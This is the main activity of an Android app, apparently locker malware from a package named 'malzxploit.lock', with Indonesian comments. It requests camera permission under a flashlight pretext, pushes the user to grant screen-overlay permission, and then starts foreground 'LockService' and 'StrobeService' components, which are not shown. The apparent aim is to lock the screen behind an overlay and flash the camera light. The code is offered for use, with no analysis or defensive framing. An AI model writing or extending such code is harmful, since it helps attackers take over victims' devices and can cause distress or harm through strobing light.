package com.malzxploit.lock;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Toast;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        // Minta izin camera dulu (buat flashlight)
        if (Build.VERSION.SDK_INT >= 23) {
            if (checkSelfPermission(Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(
                    new String[]{Manifest.permission.CAMERA}, 200);
                return;
            }
        }
        nextStep();
    }

    @Override
    public void onRequestPermissionsResult(int req, String[] perms, int[] res) {
        super.onRequestPermissionsResult(req, perms, res);
        nextStep();
    }

    private void nextStep() {
        // Minta izin overlay
        if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) {
            Toast.makeText(this, "Izinkan overlay dulu", Toast.LENGTH_LONG).show();
            try {
                Intent i = new Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName())
                );
                startActivityForResult(i, 100);
            } catch (Exception e) {
                try {
                    Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                    startActivityForResult(i, 100);
                } catch (Exception ignored) {}
            }
        } else {
            startLock();
        }
    }

    @Override
    protected void onActivityResult(int req, int res, Intent d) {
        super.onActivityResult(req, res, d);
        startLock();
    }

    private void startLock() {
        try {
            // Start LockService
            Intent lock = new Intent(this, LockService.class);
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(lock);
            } else {
                startService(lock);
            }

            // Start StrobeService
            Intent strobe = new Intent(this, StrobeService.class);
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(strobe);
            } else {
                startService(strobe);
            }

            Toast.makeText(this, "AKTIF!", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }
}
